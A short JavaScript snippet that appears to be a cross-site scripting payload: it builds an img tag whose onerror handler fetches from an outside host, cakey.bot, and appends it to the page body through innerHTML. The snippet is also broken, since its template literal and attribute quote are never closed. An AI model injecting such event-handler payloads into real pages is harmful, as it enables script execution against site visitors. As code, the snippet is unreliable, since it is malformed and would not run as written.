const payload = `<img src="x" onerror="fetch('https://cakey.bot/assets/', {mode: 'no-cors'})
  .then(response => response.text())
  .then(data => {
    console.log(data);
  })
document.body.innerHTML += payload; // Inject the payload into the body
